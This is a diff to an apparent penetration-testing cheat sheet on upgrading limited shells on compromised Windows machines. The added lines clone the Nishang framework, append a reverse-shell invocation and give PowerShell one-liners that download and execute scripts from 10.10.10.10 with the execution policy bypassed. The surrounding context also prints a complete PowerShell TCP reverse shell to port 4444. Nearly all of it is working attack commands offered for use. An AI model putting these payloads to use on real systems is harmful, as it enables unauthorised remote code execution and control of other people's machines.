@@ -124,14 +124,30 @@ You can check to see if the remote machine has Winscp.exe installed. Winscp is c
 You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:
 
 ### Upgrade Shell with PowerShell Nishang
+Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests.
 
-https://github.com/samratashok/nishang
+```bash
+root@kali:~/test# git clone https://github.com/samratashok/nishang.git                                                  
+Cloning into 'nishang'...
+remote: Enumerating objects: 1612, done.
+remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612
+Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done.
+Resolving deltas: 100% (1010/1010), done.
+root@kali:~/test# cd nishang/
+root@kali:~/test/nishang# cd Shells/
+root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 >> Invoke-PowerShellTcp.ps1
+
 ```
-@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/nishang.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\code\"
+
+```
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\code\"
+```
+OR
+```
+powershell \"IEX(New-Object Net.webClient).downloadString('http://10.10.10.10/nishang.ps1')
 ```
 
-
-### Upgrade Windows Command Line with Powershell Reverse Shell:
+### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell:
 
 You can either upload the following Reverse shell (note you will need to se the IP and Port correctly):
 *ReverseShell.ps1*  
@@ -143,7 +159,7 @@ Then run the Powershell command from the Windows Command line like so:
 powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -noexit "& ""C:\Users\Public\Downloads\ReverseShell.ps1""" 
 ```
 
-*OR* you can run this oneliner from the Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
+You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
 ```
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
 ```
